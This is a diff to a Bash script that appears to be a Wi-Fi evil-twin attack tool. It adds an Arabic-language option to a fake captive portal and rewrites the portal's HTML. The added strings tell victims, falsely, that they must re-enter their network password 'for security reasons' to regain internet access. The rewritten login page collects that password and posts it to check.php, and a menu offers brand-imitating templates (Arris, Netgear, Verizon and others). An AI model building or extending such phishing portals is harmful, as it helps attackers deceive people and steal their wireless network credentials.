@@ -329,6 +329,16 @@ DIALOG_WEB_BACK_HU="Visza"
 DIALOG_WEB_LENGHT_MIN_HU="Jelszó nem lehet kevesebb, mint 7 karakter!"
 DIALOG_WEB_LENGHT_MAX_HU="A jelszó kevesebb mint 64 karakter kell legyen!"
 
+#ARA
+DIALOG_WEB_INFO_ARA="لأسباب أمنية، أدخل كلمة المرور الخاصة بالشبكة المدونة اعلاه من تشفير <b>"$Host_ENC"</b> للحصول على اتصال الانترنت"
+DIALOG_WEB_INPUT_ARA="ادخل كلمة السر"
+DIALOG_WEB_SUBMIT_ARA="تأكيد"
+DIALOG_WEB_ERROR_ARA="<b><font color=\"red\" size=\"3\">خطأ</font>:</b>كلمة السر المدخلة<b>غير</b> صحيحة!</b>"
+DIALOG_WEB_OK_ARA="سوف يتم استعادة الاتصال في لحظات قليلة! شكرا لتعاونكم!"
+DIALOG_WEB_BACK_ARA="العودة"
+DIALOG_WEB_LENGHT_MIN_ARA="يجب أن تكون كلمة المرور أكثر من 7 أحرف او ارقام"
+DIALOG_WEB_LENGHT_MAX_ARA="يجب أن تكون كلمة المرور أقل من 64 حرفا او رقم"
+
 # Design
 function top(){
 
@@ -3618,7 +3628,7 @@ function webinterface {
 	done
 }
 
-	function ConnectionRESET {
+function ConnectionRESET {
 
 		while true; do
 			conditional_clear
@@ -3639,16 +3649,17 @@ function webinterface {
 			echo -e "$blue""9)"$transparent"  Turkish     [TR]   (NEUTRA)"
 			echo -e "$blue""10)"$transparent" Romanian    [RO]   (NEUTRA)"
 			echo -e "$blue""11)"$transparent" Hungarian   [HU]   (NEUTRA)"
-			echo -e "$blue""12)"$transparent" Arris       [ENG]"
-			echo -e "$blue""13)"$transparent" Belkin      [ENG]"
-			echo -e "$blue""14)"$transparent" Xfinity     [ENG]"
-			echo -e "$blue""15)"$transparent" Netgear     [ENG]"
-			echo -e "$blue""16)"$transparent" Huawei      [ENG]"
-            echo -e "$blue""17)"$transparent" Verizon     [ENG]"
-			echo -e "$blue""18)"$transparent" Netgear     [ESP]"
-			echo -e "$blue""19)"$transparent" Arris       [ESP]"
-			echo -e "$blue""20)"$transparent" Vodafone    [ESP]"
-			echo -e "$blue""21)"$transparent"\e[1;31m $general_back"$transparent""
+			echo -e "$blue""12)"$transparent" Arabic      [ARA]  (NEUTRA)"
+			echo -e "$blue""13)"$transparent" Arris       [ENG]"
+			echo -e "$blue""14)"$transparent" Belkin      [ENG]"
+			echo -e "$blue""15)"$transparent" Xfinity     [ENG]"
+			echo -e "$blue""16)"$transparent" Netgear     [ENG]"
+			echo -e "$blue""17)"$transparent" Huawei      [ENG]"
+			echo -e "$blue""18)"$transparent" Verizon     [ENG]"
+			echo -e "$blue""19)"$transparent" Netgear     [ESP]"
+			echo -e "$blue""20)"$transparent" Arris       [ESP]"
+			echo -e "$blue""21)"$transparent" Vodafone    [ESP]"
+			echo -e "$blue""22)"$transparent"\e[1;31m $general_back"$transparent""
 			echo
 			echo -n "#? "
 			read fluxass
@@ -3787,43 +3798,55 @@ function webinterface {
 				break
 
 			elif [ "$fluxass" = "12" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ARA
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ARA
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ARA
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_ARA
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ARA
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ARA
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ARA
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ARA
+				NEUTRA
+				break
+				
+			elif [ "$fluxass" = "13" ]; then
                 ARRIS
 				break
 
-			elif [ "$fluxass" = "13" ]; then
+			elif [ "$fluxass" = "14" ]; then
 				BELKIN
 				break
 
-			elif [ "$fluxass" = "14" ]; then
+			elif [ "$fluxass" = "15" ]; then
 				XFINITY
 				break
 
-			elif [ "$fluxass" = "15" ]; then
+			elif [ "$fluxass" = "16" ]; then
 				NETGEAR
 				break
 
 
-            elif [ "$fluxass" = "16" ]; then
+            elif [ "$fluxass" = "17" ]; then
 				HUAWEI
 				break
 
-			elif [ "$fluxass" = "17" ]; then
+			elif [ "$fluxass" = "18" ]; then
 				VERIZON
 				break
 
-			elif [ "$fluxass" = "18" ]; then
+			elif [ "$fluxass" = "19" ]; then
 				NETGEAR2
 				break
 
-			elif [ "$fluxass" = "19" ]; then
+			elif [ "$fluxass" = "20" ]; then
 				ARRIS2
 				break
 			
-			elif [ "$fluxass" = "20" ]; then
+			elif [ "$fluxass" = "21" ]; then
 				VODAFONE
 				break
 			
-            elif [ "$fluxass" = "21" ]; then
+            elif [ "$fluxass" = "22" ]; then
 				conditional_clear
 				webinterface
 				break
@@ -7059,179 +7082,95 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA="| base64 -d >$DUMP_PATH/file.zi
 	rm $DUMP_PATH/file.zip &>$flux_output_device
 
 	echo "<!DOCTYPE html>
-	<html>
-	<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />
+<html>
 	<head>
-	    <title>Login</title>
-	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
-	    <style>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.css)</style>
-	    <script>$(cat $DUMP_PATH/data/jquery-1.8.3.min.js)</script>
-	    <script>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.js)</script>
-	    <style>
-	.ui-btn {
-	    width: 20% !important;
-	}
-	</style>
+	    <title>Login Page</title>
+	    <meta charset=\"UTF-8\">
+	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
+	    <link rel=\"stylesheet\" type=\"text/css\" href=\"jquery.mobile-1.3.2.css\">
+	    <script src=\"jquery-1.8.3.min.js\"></script>
+	    <script src=\"jquery.mobile-1.3.2.js\"></script>
 	</head>
 	<body>
 	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
-
-		<div data-role=\"content\">
-
-	"$DIALOG_WEB_OK"
-		</div>
-
-		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-
-		</div>
-	    </div>
-	    <div data-role=\"page\" id=\"second\">
-		<div data-theme=\"a\" data-role=\"top\">
-		    <h3></h3>
-		</div>
-
-		<div data-role=\"content\">
-
-		</div>
-
-		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-		</div>
+			<div data-role=\"content\">"$DIALOG_WEB_OK"</div>
+			<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\"></div>
 	    </div>
 	</body>
-	</html>
-	">$DUMP_PATH/data/final.html
+</html>" > $DUMP_PATH/data/final.html
+
 	echo "<!DOCTYPE html>
-	<html>
-	<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />
+<html>
 	<head>
-	    <title>Login</title>
-	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
-	    <style>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.css)</style>
-	    <script>$(cat $DUMP_PATH/data/jquery-1.8.3.min.js)</script>
-	    <script>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.js)</script>
+	    <title>Login Page</title>
+	    <meta charset=\"UTF-8\">
+	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
+	    <link rel=\"stylesheet\" type=\"text/css\" href=\"jquery.mobile-1.3.2.css\">
+	    <script src=\"jquery-1.8.3.min.js\"></script>
+	    <script src=\"jquery.mobile-1.3.2.js\"></script>
 	</head>
 	<body>
 	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
-
-		<div data-role=\"content\">
-
-		    "$DIALOG_WEB_ERROR"
-	<br>
-	<a href=\"index.htm\" data-role=\"button\" rel=\"external\" data-inline=\"true\" id=\"back\" onclick=\"location.reload();location.href='index.htm'\">"$DIALOG_WEB_BACK"</a>
-
-		</div>
-
-		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-
-		</div>
-	    </div>
-	    <div data-role=\"page\" id=\"second\">
-		<div data-theme=\"a\" data-role=\"top\">
-		    <h3></h3>
-		</div>
-
-		<div data-role=\"content\">
-
-		</div>
-
-		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-		</div>
+			<div data-role=\"content\">"$DIALOG_WEB_ERROR"<br><a href=\"index.htm\" data-role=\"button\" rel=\"external\" data-inline=\"true\" id=\"back\" onclick=\"location.reload();location.href='index.htm'\">"$DIALOG_WEB_BACK"</a></div>
+			<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\"></div>
 	    </div>
 	</body>
-	</html>
-	">$DUMP_PATH/data/error.html
+</html>" > $DUMP_PATH/data/error.html
 
 	echo "<!DOCTYPE html>
 	<html>
-	<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />
 	<head>
-	    <title>Login</title>
-	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
-	    <style>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.css)</style>
-	    <script>$(cat $DUMP_PATH/data/jquery-1.8.3.min.js)</script>
-	    <script>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.js)</script>
+	    <title>Login Page</title>
+	    <meta charset=\"UTF-8\">
+	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
+	    <link rel=\"stylesheet\" type=\"text/css\" href=\"jquery.mobile-1.3.2.css\">
+	    <script src=\"jquery-1.8.3.min.js\"></script>
+	    <script src=\"jquery.mobile-1.3.2.js\"></script>
 	    <style>
 		#login-button {
 		    margin-top: 30px;
 		}
 
-	.ui-grid-c {
-	    text-align : center;
-		margin-right: -50% !important;
+		.ui-grid-c {
+		    text-align : center;
+		    margin-right: -50% !important;
+		}
 
-	}
+		.ui-block-b {
+		    text-align : left;
+		}
 
-	.ui-block-b {
-	    text-align : left;
-
-	}
-
-	.ui-block-a {
-	    text-align : right;
-		margin-right: 10px !important;
-
-
-	}
+		.ui-block-a {
+		    text-align : right;
+		    margin-right: 10px !important;
+		}
 	    </style>
 	</head>
 	<body>
 	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
-
-		<div data-role=\"content\">
-		<fieldset>
-		    <form id=\"check-user\" class=\"ui-body ui-body-a ui-corner-all\" data-ajax=\"false\" action=\"check.php\" method=\"POST\" >
-	<div class=ui-grid-c>
-
-	      <div class=ui-block-a>ESSID:</div>
-
-	      <div class=ui-block-b><b>$Host_SSID</b></div>
-
-	      <div class=ui-block-a>BSSID:</div>
-
-	      <div class=ui-block-b><b>$Host_MAC</b></div>
-
-	      <div class=ui-block-a>Chan:</div>
-
-	      <div class=ui-block-b><b>$Host_CHAN</b></div>
-
-	    </div>
-
-	<br>
-
-	"$DIALOG_WEB_INFO"
-			    <div data-role=\"fieldcontain\">
-				<label for=\"password\">"$DIALOG_WEB_INPUT"</label>
-				</div>
-				<input type=\"password\" value=\"\" name=\"key1\" id=\"key1\"/>
-
-			    <input type=\"submit\" data-theme=\"b\" name=\"submit\" id=\"submit\" data-inline=\"true\" value=\""$DIALOG_WEB_SUBMIT"\">
-			</fieldset>
-		    </form>
-		</div>
-
-		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-
-		</div>
-	    </div>
-	    <div data-role=\"page\" id=\"second\">
-		<div data-theme=\"a\" data-role=\"top\">
-		    <h3></h3>
-		</div>
-
-		<div data-role=\"content\">
-
-		</div>
-
-		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-		</div>
+			<div data-role=\"content\">
+				<fieldset>
+					<form id=\"check-user\" class=\"ui-body ui-body-a ui-corner-all\" data-ajax=\"false\" action=\"check.php\" method=\"POST\" >
+						<div class=ui-grid-c>
+							<div class=ui-block-a>ESSID:</div>
+							<div class=ui-block-b><b>$Host_SSID</b></div>
+							<div class=ui-block-a>BSSID:</div>
+							<div class=ui-block-b><b>$Host_MAC</b></div>
+							<div class=ui-block-a>Chan:</div>
+							<div class=ui-block-b><b>$Host_CHAN</b></div>
+						</div><br>$DIALOG_WEB_INFO
+						
+						<div data-role=\"fieldcontain\"><label for=\"password\">$DIALOG_WEB_INPUT</label></div>
+						<input type=\"password\" value=\"\" name=\"key1\" id=\"key1\"/>
+						<input type=\"submit\" data-theme=\"b\" name=\"submit\" id=\"submit\" data-inline=\"true\" value=\"$DIALOG_WEB_SUBMIT\"/>
+					</form>
+				</fieldset>
+			</div>
+			<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\"></div>
 	    </div>
 	</body>
-	</html>
-	">$DUMP_PATH/data/index.htm
-
-
-
-	}
+</html>" > $DUMP_PATH/data/index.htm
+}
 
 
 	# Crea el contenido de la interface web
